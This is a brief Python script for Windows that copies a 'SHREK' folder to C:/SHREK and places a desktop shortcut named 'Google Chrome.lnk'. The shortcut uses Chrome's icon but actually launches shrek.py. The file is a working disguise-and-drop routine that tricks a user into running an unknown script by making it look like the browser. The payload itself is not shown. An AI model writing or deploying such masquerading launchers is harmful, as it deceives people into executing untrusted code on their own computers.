import os, winshell
from win32com.client import Dispatch
import shutil 
import time
desktop = winshell.desktop()

src = "SHREK"

dest = "C:/SHREK"

destination = shutil.copytree(src, dest) 

time.sleep(1)

path = os.path.join(desktop, "Google Chrome.lnk")
target = "C:\\SHREK\\shrek.py"
wDir = "C:\\SHREK"
icon = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
shell = Dispatch('WScript.Shell')
shortcut = shell.CreateShortCut(path)
shortcut.Targetpath = target
shortcut.WorkingDirectory = wDir
shortcut.IconLocation = icon
shortcut.save()